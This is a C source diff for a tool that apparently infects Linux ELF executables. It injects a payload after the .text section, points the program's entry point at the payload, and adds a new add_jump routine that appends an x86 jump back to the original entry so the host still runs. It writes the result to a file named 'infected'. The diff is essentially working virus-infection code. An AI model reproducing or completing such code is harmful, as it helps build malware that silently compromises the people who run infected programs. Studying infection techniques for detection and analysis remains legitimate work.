@@ -2,9 +2,13 @@
 #include <elf.h>
 #include <stdlib.h>
 #include <log.h>
+#include <string.h>
 
 #include "elf-parser.h"
 #include "utils.h"
+#include "insertion.h"
+
+#define JUMP_SIZE 5
 
 /*
  * Insert the _dest_ array into the ELF file
@@ -15,12 +19,15 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
     byte *final_product = NULL;
     Elf64_Phdr *seg = get_exe_segment();
     Elf64_Addr old_entry = get_entry_point();			// To use later
-
+   
     /* First we find the section .text */
     Elf64_Shdr *text = get_section_by_name(".text");
     if (text == NULL) {
 	ERROR("Can't find the section .text", NULL);
     }
+
+    Elf64_Addr new_entry = text->sh_addr + text->sh_size;
+    add_jump(&src, &src_size, new_entry, old_entry);
 
     /* Then we find the segment that contains the text section */
     for (; seg != NULL; seg = get_exe_segment()) {
@@ -30,7 +37,7 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
     }
 
     /* Now we update the entry point */
-    set_entry_point(text->sh_addr + text->sh_size);
+    set_entry_point(new_entry);
 
     /* TMP */
     add_offset(text->sh_offset, src_size);
@@ -60,4 +67,20 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
 	final_product[i + j] = dest[i];
     }
     write_file("infected", final_product, dest_size + src_size);
+}
+
+void add_jump(byte **payload_addr, uint16_t *size, Elf64_Addr new_entry, Elf64_Addr old_entry) {
+    /* We setup the offset */
+    int32_t offset = old_entry - (new_entry + *size + JUMP_SIZE);
+    byte *new_dest = calloc(*size + JUMP_SIZE, sizeof(byte));
+    /* We copy the original payload into a new buffer */
+    memcpy(new_dest, *payload_addr, *size);
+    /* Now we add the jump instruction */
+    new_dest[*size] = 0xe9;
+    memcpy(new_dest + *size + 1, &offset, sizeof(int32_t));
+    /* We free the old buffer */
+    free(*payload_addr);
+    /* We setup the new values for the payload */
+    *payload_addr = new_dest;
+    *size = *size + JUMP_SIZE;
 }
